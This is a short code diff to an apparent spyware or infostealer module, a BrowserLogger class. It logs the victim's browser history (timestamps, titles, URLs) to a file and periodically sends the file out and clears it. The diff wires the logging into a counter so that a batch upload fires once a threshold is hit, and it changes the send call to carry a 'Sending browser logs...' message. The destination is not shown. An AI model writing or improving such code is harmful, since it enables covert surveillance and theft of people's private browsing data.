@@ -22,12 +22,13 @@ class BrowserLogger:
                     log_to_file(
                         self.log_file, f"{search[2]}: {search[1]} ({search[0]})", "w"
                     )
+                    log_info(f"Logged browser history: {search[2]}: {search[1]} ({search[0]})")
+                    self.increment_and_check_counter()
     
     def increment_and_check_counter(self):
         self.counter += 1
-        if self.counter > self.counter_max:
-            log_info("SENDING BROWSER LOG FILE")
-            send_log_file(self.log_file)
+        if self.counter >= self.counter_max:
+            send_log_file("`Sending browser logs...`", self.log_file)
             clear_log_file(self.log_file)
             log_info("Sent and cleared browser log file.")
             self.counter = 0
